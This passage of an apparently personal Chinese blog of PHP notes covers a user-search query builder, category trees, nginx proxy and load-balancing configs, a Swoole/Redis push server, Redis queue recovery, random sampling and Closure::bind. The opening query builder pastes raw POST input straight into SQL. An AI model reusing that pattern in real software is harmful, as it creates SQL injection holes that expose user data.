class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> (isset($_POST[<span class="string">'username'</span>])) &#123;</span><br><span class="line">        $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">        $like .= <span class="string">"username like '%"</span> . $username . <span class="string">"%' and "</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isset($_POST[<span class="string">'phone'</span>])) &#123;</span><br><span class="line">        $phone = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">        $like .= <span class="string">"phone like '%"</span> . $phone . <span class="string">"%' and"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'is_auth'</span>]) &#123;</span><br><span class="line">        $isAuth = $_POST[<span class="string">'is_auth'</span>];</span><br><span class="line">        $like .= <span class="string">"is_auth like '%"</span> . $isAuth . <span class="string">"%' and"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'sex'</span>]) &#123;</span><br><span class="line">        $sex = $_POST[<span class="string">'sex'</span>];</span><br><span class="line">        $like .= <span class="string">"sex like '%"</span> . $sex . <span class="string">"%' and"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'time'</span>]) &#123;</span><br><span class="line">        $time = $_POST[<span class="string">'time'</span>];</span><br><span class="line">        $like .= <span class="string">"time like '%"</span> . $time . <span class="string">"%' and"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'wallet'</span>]) &#123;</span><br><span class="line">        $wallet = $_POST[<span class="string">'wallet'</span>];</span><br><span class="line">        $like .= <span class="string">"wallet like '%"</span> . $wallet . <span class="string">"%' and"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $like = rtrim($like, <span class="string">'and'</span>);</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"SELECT * FROM `user` WHERE &#123;$like&#125;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'user'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params">$param = null</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Request($param);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">string $param = null</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> isset($_POST[$param]) ? $_POST[$param] : <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">all</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $_POST;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $request = [</span><br><span class="line">        <span class="string">'username'</span>,</span><br><span class="line">        <span class="string">'phone'</span>,</span><br><span class="line">        <span class="string">'is_auth'</span>,</span><br><span class="line">        <span class="string">'sex'</span>,</span><br><span class="line">        <span class="string">'time'</span>,</span><br><span class="line">        <span class="string">'wallet'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (IS_POST) &#123;</span><br><span class="line">            $like = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">            foreach (request()-&gt;all() <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">if</span> (in_array($key, $<span class="keyword">this</span>-&gt;request) &amp;&amp; request($key)) &#123;</span><br><span class="line">                    $like .= sprintf(<span class="string">"%s like %s and"</span>, $key, $value);</span><br><span class="line">                    <span class="comment">//$like[] = sprintf("%s like %s", $key, $value);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//$sql = implode(" AND ", $like);</span></span><br><span class="line">            $like = rtrim($like, <span class="string">'and'</span>);</span><br><span class="line"></span><br><span class="line">            $sql = <span class="string">"SELECT * FROM `user` WHERE &#123;$like&#125;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> view(<span class="string">'user'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//github.com/CrazyCodes/Blog/blob/master/%E6%88%91%E4%B8%8EJetbrains%E7%9A%84%E8%BF%99%E4%BA%9B%E5%B9%B4.md</span></span><br><span class="line">https:<span class="comment">//segmentfault.com/a/1190000019274366</span></span><br></pre></td></tr></table></figure>
<h3 id="无限极分类树"><a href="#无限极分类树" class="headerlink" title="无限极分类树"></a>无限极分类树</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">array(</span><br><span class="line">    <span class="number">1</span> =&gt; array(</span><br><span class="line">            <span class="string">'id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="string">'中华人民共和国'</span>,</span><br><span class="line">            <span class="string">'parent_id'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'level'</span> =&gt; <span class="string">'country'</span>,</span><br><span class="line">        ),</span><br><span class="line">    <span class="number">2</span> =&gt; array(</span><br><span class="line">            <span class="string">'id'</span> =&gt; <span class="number">2</span>,</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="string">'北京市'</span>,</span><br><span class="line">            <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'level'</span> =&gt; <span class="string">'province'</span>,</span><br><span class="line">        ),</span><br><span class="line">    <span class="number">20</span> =&gt; array(</span><br><span class="line">            <span class="string">'id'</span> =&gt; <span class="number">20</span>,</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="string">'天津市'</span>,</span><br><span class="line">            <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'level'</span> =&gt; <span class="string">'province'</span>,</span><br><span class="line">        ),</span><br><span class="line">    <span class="number">38</span> =&gt; array(</span><br><span class="line">            <span class="string">'id'</span> =&gt; <span class="number">38</span>,</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="string">'河北省'</span>,</span><br><span class="line">            <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'level'</span> =&gt; <span class="string">'province'</span>,</span><br><span class="line">        ),</span><br><span class="line">    <span class="number">218</span> =&gt; array(</span><br><span class="line">            <span class="string">'id'</span> =&gt; <span class="number">218</span>,</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="string">'山西省'</span>,</span><br><span class="line">            <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'level'</span> =&gt; <span class="string">'province'</span>,</span><br><span class="line">        ),</span><br><span class="line">    <span class="number">349</span> =&gt; array(</span><br><span class="line">            <span class="string">'id'</span> =&gt; <span class="number">349</span>,</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="string">'内蒙古自治区'</span>,</span><br><span class="line">            <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'level'</span> =&gt; <span class="string">'province'</span>,</span><br><span class="line">        ),</span><br><span class="line">    <span class="number">465</span> =&gt; array(</span><br><span class="line">            <span class="string">'id'</span> =&gt; <span class="number">465</span>,</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="string">'辽宁省'</span>,</span><br><span class="line">            <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'level'</span> =&gt; <span class="string">'province'</span>,</span><br><span class="line">        ),</span><br><span class="line">    ...</span><br><span class="line">);</span><br><span class="line">优化前</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 获取以父级 ID 为 $parent_id 为根节点的树型结构数组</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* @param array $arr</span></span><br><span class="line"><span class="comment">* @param int $level 树型当前层</span></span><br><span class="line"><span class="comment">* @param int $parent_id 父级id</span></span><br><span class="line"><span class="comment">* @param int $floor 树型总层数</span></span><br><span class="line"><span class="comment">* @return array</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getList</span>(<span class="params">&amp;$arr, $level = <span class="number">0</span>, $parent_id = <span class="number">1</span>, $floor = <span class="number">3</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($level != <span class="number">0</span>) &#123;</span><br><span class="line">        $empty = $arr[$parent_id];</span><br><span class="line">        $empty[<span class="string">'list'</span>] = [];</span><br><span class="line">        $emptyPointer = &amp;$empty[<span class="string">'list'</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $empty = [];</span><br><span class="line">        $emptyPointer = &amp;$empty;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($level &lt; $floor) &#123;</span><br><span class="line">        $ok = <span class="literal">false</span>;</span><br><span class="line">        foreach ($arr <span class="keyword">as</span> $index =&gt; &amp;$item) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($item[<span class="string">'parent_id'</span>] == $parent_id) &#123;</span><br><span class="line">                $data = self::getList($arr, $level + <span class="number">1</span>, $index);</span><br><span class="line">                array_push($emptyPointer, $data);</span><br><span class="line">                $ok = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($ok &amp;&amp; $item[<span class="string">'parent_id'</span>] != $parent_id) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $empty;</span><br><span class="line">&#125;</span><br><span class="line">优化后https:<span class="comment">//wi1dcard.cn/posts/php-fastest-create-tree-from-list/</span></span><br><span class="line"></span><br><span class="line">public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getList</span>(<span class="params">$catList</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $treeData = [];</span><br><span class="line">    foreach ($catList <span class="keyword">as</span> &amp;$item) &#123;</span><br><span class="line">        $parent_id = $item[<span class="string">'parent_id'</span>];</span><br><span class="line">        <span class="keyword">if</span> (isset($catList[$parent_id]) &amp;&amp; !empty($catList[$parent_id])) &#123;</span><br><span class="line">            $catList[$parent_id][<span class="string">'list'</span>][] = &amp;$catList[$item[<span class="string">'id'</span>]];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $treeData[] = &amp;$catList[$item[<span class="string">'id'</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unset($item);</span><br><span class="line">    <span class="keyword">return</span> $treeData[<span class="number">0</span>][<span class="string">'list'</span>]; <span class="comment">// 根节点只有中华人民共和国，所以直接返回中国的所有子节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="代理与反向代理、负载均衡和缓存"><a href="#代理与反向代理、负载均衡和缓存" class="headerlink" title="代理与反向代理、负载均衡和缓存"></a>代理与反向代理、负载均衡和缓存</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">代理（正向代理，目标服务器不知道谁在访问）</span><br><span class="line"></span><br><span class="line">位于客户端和目标服务器之间，起到一个中转的作用。其实就是客户端想访问目标服务器，但是因为某些原因不能够直接访问，则把请求和目标服务器发给代理服务器，代理服务器再去请求目标服务器，把返回的响应结果返回给客户端。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">反向代理（用户实际并不知道最终服务器，只是访问一个反向代理服务器而已）</span><br><span class="line"></span><br><span class="line">客户端会把反向代理服务器当成目标服务器，向反向代理服务器发送请求后，反向代理服务器再请求内部的后端服务器，把得到的响应结果返回给客户端。</span><br><span class="line">server&#123;</span><br><span class="line">listen <span class="number">80</span>;</span><br><span class="line">  server_name test.test;</span><br><span class="line">  #将本机接收到的test.test的请求全部转发到另外一台服务器192.168.78.128</span><br><span class="line">  location /&#123;</span><br><span class="line">    proxy_pass http:<span class="comment">//192.168.78.128; </span></span><br><span class="line">    #下面是其他辅助指令</span><br><span class="line">    proxy_set_header Host $host; #更改来自客户端的请求头信息</span><br><span class="line">    proxy_set_header X-Real_IP $remote_addr;    #用户真实访问ip</span><br><span class="line">    proxy_connect_timeout 2; #配置nginx与后端服务器建立连接的超时时间</span><br><span class="line">    proxy_read_timeout 2; #配置nginx向后端发出read请求的等待响应超时时间</span><br><span class="line">    proxy_send_timeout 2; #配置nginx向后端服务器发出write请求的等待响应超时时间</span><br><span class="line">    proxy_redirect http:<span class="comment">//www.baidu.com; #用于修改后端服务器返回的响应头中的Location和Refresh</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">用户不直接访问后端服务器，而是访问负载均衡服务器，由负载均衡服务器再次转发到后端服务器。如果这个时候有一台后端服务器挂掉了，那么负载均衡服务器会剔除掉它，将后续请求都转发到好的那台，这样就不影响网站的正常运行</span><br><span class="line">server&#123;</span><br><span class="line">    listen <span class="number">80</span>;</span><br><span class="line">  server_name test.test;</span><br><span class="line">  location / &#123;</span><br><span class="line">    proxy_pass http:<span class="comment">//web_server; #反向代理</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">#配置负载均衡服务器组</span><br><span class="line">upstream web_server &#123;</span><br><span class="line">    server <span class="number">192.168</span><span class="number">.78</span><span class="number">.128</span>;</span><br><span class="line">  server <span class="number">192.168</span><span class="number">.78</span><span class="number">.129</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#配置负载均衡服务器组</span><br><span class="line">upstream web_server &#123;</span><br><span class="line">    server <span class="number">192.168</span><span class="number">.78</span><span class="number">.128</span> weight=<span class="number">1</span>;</span><br><span class="line">  server <span class="number">192.168</span><span class="number">.78</span><span class="number">.129</span> weight=<span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">这里面的权值总和为一个循环，这里以 <span class="number">4</span> 次为一个循环，那么就是每四次请求中，三次会被分派到 <span class="number">129</span> 这个服务器，一次分配到 <span class="number">128</span>，但是具体三次并不会顺序执行，而是按照算法分散执行。https:<span class="comment">//learnku.com/articles/26686 https://learnku.com/articles/29231#reply92298</span></span><br></pre></td></tr></table></figure>
<h3 id="Swoole-Redis-list实现简单消息推送"><a href="#Swoole-Redis-list实现简单消息推送" class="headerlink" title="Swoole,Redis list实现简单消息推送"></a>Swoole,Redis list实现简单消息推送</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">swoole.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$server = <span class="keyword">new</span> swoole_websocket_server(<span class="string">"0.0.0.0"</span>, <span class="number">9502</span>);</span><br><span class="line"></span><br><span class="line">$server-&gt;on(<span class="string">'workerStart'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$server, $workerId</span>) </span>&#123;</span><br><span class="line">    $redis = <span class="keyword">new</span> Swoole\Coroutine\Redis();</span><br><span class="line">    $redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// brpop 第二个参数 50 表示超时（阻塞等待）时间, blpop 同理，详情建议读文档,对应的 redis 操作是 rpush/lpush key content </span></span><br><span class="line">        <span class="keyword">if</span> (($message = $redis-&gt;brpop(<span class="string">'message'</span>, <span class="number">50</span>)) === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// var_dump($message); 结果为数组 </span></span><br><span class="line">        foreach ($server-&gt;connections <span class="keyword">as</span> $fd) &#123;</span><br><span class="line">            $server-&gt;push($fd, <span class="string">'redis 的 '</span> . $message[<span class="number">0</span>] . <span class="string">' 队列发送消息:'</span> . $message[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$server-&gt;on(<span class="string">'open'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$server, $request</span>) </span>&#123;</span><br><span class="line">    $server-&gt;push($request-&gt;fd, <span class="string">"hello;\n"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$server-&gt;on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">swoole_websocket_server $server, $request</span>) </span>&#123;</span><br><span class="line">    $server-&gt;push($request-&gt;fd, <span class="string">"hello"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$server-&gt;on(<span class="string">'close'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$server, $fd</span>) </span>&#123;</span><br><span class="line">    echo <span class="string">"client-&#123;$fd&#125; is closed\n"</span>;</span><br><span class="line">    $server-&gt;close($fd);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$server-&gt;start();</span><br><span class="line"><span class="comment">//https://alpha2016.github.io/2019/02/16/PHP,Swoole,Redis-list%E5%AE%9E%E7%8E%B0%E6%B6%88%E6%81%AF%E6%8E%A8%E9%80%81/</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-list队列异常崩溃"><a href="#Redis-list队列异常崩溃" class="headerlink" title="Redis list队列异常崩溃"></a>Redis list队列异常崩溃</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用 Redis list 做消息队列，在取出消息的时候 Redis 宕机，程序上的业务逻辑没执行，怎样处理？先不去考虑 Redis 的异常处理及恢复，一般主从哨兵机制很难崩溃，暂时考虑程序端如何处理这种</span><br><span class="line"></span><br><span class="line">直接使用 Redis 官方的 RPOPLPUSH / BRPOPLPUSH source destination 命令，在读取消息的同时，将读取到的消息内容放到目标队列，然后当前进程进行消费数据，消费成功，则 lrem destination <span class="number">1</span> key 在目标队列中删除刚才的消息内容。</span><br></pre></td></tr></table></figure>
<h3 id="从0-n之间取k个不重复的数"><a href="#从0-n之间取k个不重复的数" class="headerlink" title="从0-n之间取k个不重复的数"></a>从0-n之间取k个不重复的数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">使用 array 系列函数的方法</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandomN</span>(<span class="params">$max, $num</span>) </span>&#123;</span><br><span class="line">    $count = <span class="number">0</span>;</span><br><span class="line">    $<span class="keyword">return</span> = array();</span><br><span class="line">    <span class="keyword">while</span> ($count &lt; $num) &#123;</span><br><span class="line">        $<span class="keyword">return</span>[] = mt_rand(<span class="number">0</span>, $max);</span><br><span class="line">        $<span class="keyword">return</span> = array_flip(array_flip($<span class="keyword">return</span>));</span><br><span class="line">        $count = count($<span class="keyword">return</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    shuffle($<span class="keyword">return</span>);</span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> getRandomN(<span class="number">20</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// output:[7,14,6,12,3,4,15,0,16,10]</span></span><br><span class="line">不使用 array 系列函数的方法</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandomN</span>(<span class="params">$num, $n</span>)</span>&#123;</span><br><span class="line">    $startArray = range(<span class="number">0</span>, $num);</span><br><span class="line">    $resultArray = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $random = mt_rand(<span class="number">0</span>, $num - $i);</span><br><span class="line">        $resultArray[$i] = $startArray[$random];</span><br><span class="line">        $startArray[$random] = $startArray[$num - $i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $resultArray;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> getRandomN(<span class="number">20</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// output:[7,14,6,12,3,4,15,0,16,10]</span></span><br><span class="line">https:<span class="comment">//alpha2016.github.io/2019/04/09/PHP%E4%BB%8E0-n%E4%B9%8B%E9%97%B4%E9%9A%8F%E6%9C%BA%E5%8F%96k%E4%B8%AA%E4%B8%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0/</span></span><br></pre></td></tr></table></figure>
<h3 id="匿名函数-1"><a href="#匿名函数-1" class="headerlink" title="匿名函数"></a>匿名函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明一个狗对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $name = <span class="string">'旺财'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明一个猫对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $name = <span class="string">'喵喵'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明一个匿名函数，用来输出名字</span></span><br><span class="line">$sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    echo $<span class="keyword">this</span>-&gt;name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//用bind赋值上面那个匿名函数，并指定this指向狗对象，返回新的闭包函数</span></span><br><span class="line">$sayDogName = Closure::bind($sayName, <span class="keyword">new</span> Dog);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用新的闭包函数，输出 “旺财”</span></span><br><span class="line">$sayDogName();  </span><br><span class="line"><span class="comment">//指定类的作用域为 Dog 对象</span></span><br><span class="line">$sayDogName = Closure::bind($sayName, <span class="keyword">new</span> Dog, <span class="string">'Dog'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出 “旺财”</span></span><br><span class="line">$sayDogName();</span><br></pre></td></tr></table></figure>
